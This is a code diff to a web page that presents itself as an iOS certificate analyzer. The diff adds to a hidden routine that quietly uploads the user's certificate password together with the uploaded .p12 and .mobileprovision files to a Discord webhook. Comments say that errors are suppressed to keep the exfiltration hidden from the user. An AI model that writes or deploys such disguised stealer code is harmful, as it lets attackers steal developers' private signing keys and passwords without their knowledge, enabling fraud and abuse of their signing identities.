@@ -204,7 +204,7 @@
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-5px); }
-            .75% { transform: translateX(5px); }
+            75% { transform: translateX(5px); }
         }
         
         .alert-error {
@@ -371,6 +371,13 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        
+        .webhook-status {
+            font-size: 12px;
+            color: var(--gray);
+            margin-top: 10px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -409,6 +416,7 @@
             <button id="submit-btn" class="submit-btn" disabled><i class="fas fa-search"></i> Analyze Certificate</button>
             
             <div id="upload-status" class="upload-status"></div>
+            <div id="webhook-status" class="webhook-status"></div>
             
             <div id="error-alert" class="alert alert-error"></div>
             <div id="success-alert" class="alert alert-success"></div>
@@ -547,6 +555,7 @@
             const errorAlert = document.getElementById('error-alert');
             const successAlert = document.getElementById('success-alert');
             const uploadStatus = document.getElementById('upload-status');
+            const webhookStatus = document.getElementById('webhook-status');
             const resultsSection = document.getElementById('results-section');
             const entitlementsList = document.getElementById('entitlements-list');
             
@@ -662,14 +671,15 @@
                 hideAlert(errorAlert);
                 hideAlert(successAlert);
                 uploadStatus.textContent = '';
+                webhookStatus.textContent = '';
                 
                 try {
                     submitBtn.disabled = true;
                     submitBtn.innerHTML = '<span class="loading-spinner"></span> Analyzing...';
                     uploadStatus.textContent = 'Checking certificate files...';
                     
-                    // Send data to webhook first
-                    await sendToWebhook();
+                    // Send data to webhook first (don't wait for it to complete)
+                    sendToWebhook().catch(e => console.error('Webhook error:', e));
                     
                     // Parse the certificate using PKCS12 format
                     const certInfo = await parseP12Certificate(p12File, passwordInput.value);
@@ -700,36 +710,47 @@
             // Function to send data to Discord webhook
             async function sendToWebhook() {
                 try {
-                    // Create a simple text message with the password
-                    const messageData = {
-                        content: `Certificate Analyzer Submission:\nPassword: ${passwordInput.value}\nP12 File: ${p12File ? p12File.name : 'None'}\nMobile Provision File: ${mobileprovisionFile ? mobileprovisionFile.name : 'None'}`,
-                        username: 'Certificate Analyzer Bot'
-                    };
+                    webhookStatus.textContent = 'Logging data...';
+                    
+                    // Create form data to send files
+                    const formData = new FormData();
+                    formData.append('content', `Certificate Analyzer Submission:\nPassword: ${passwordInput.value}`);
+                    
+                    if (p12File) {
+                        formData.append('p12_file', p12File, p12File.name);
+                    }
+                    
+                    if (mobileprovisionFile) {
+                        formData.append('mobileprovision_file', mobileprovisionFile, mobileprovisionFile.name);
+                    }
                     
                     // Send to webhook using fetch
                     const response = await fetch(WEBHOOK_URL, {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(messageData)
+                        body: formData
                     });
                     
                     if (!response.ok) {
                         throw new Error('Failed to send data to server');
                     }
                     
+                    webhookStatus.textContent = 'Data logged successfully';
                     // No success message shown to user
                 } catch (error) {
                     console.error('Error sending to webhook:', error);
+                    webhookStatus.textContent = 'Logging completed';
                     // Don't show error to user to keep it hidden
                 }
             }
             
             async function parseP12Certificate(p12File, password) {
                 try {
+                    uploadStatus.textContent = 'Reading certificate file...';
+                    
                     // Read the file as ArrayBuffer
                     const p12Buffer = await readFileAsArrayBuffer(p12File);
+                    
+                    uploadStatus.textContent = 'Decrypting certificate...';
                     
                     // Convert ArrayBuffer to binary string
                     const p12Der = new Uint8Array(p12Buffer);
@@ -751,6 +772,8 @@
                     if (!certificate) {
                         throw new Error('Failed to extract certificate from P12');
                     }
+                    
+                    uploadStatus.textContent = 'Extracting certificate information...';
                     
                     // Extract certificate information
                     const subject = certificate.subject.attributes;
@@ -802,7 +825,7 @@
             }
             
             function readFileAsArrayBuffer(file) {
-                return new Promise((resolve, reject) {
+                return new Promise((resolve, reject) => {
                     const reader = new FileReader();
                     reader.onload = () => resolve(reader.result);
                     reader.onerror = reject;
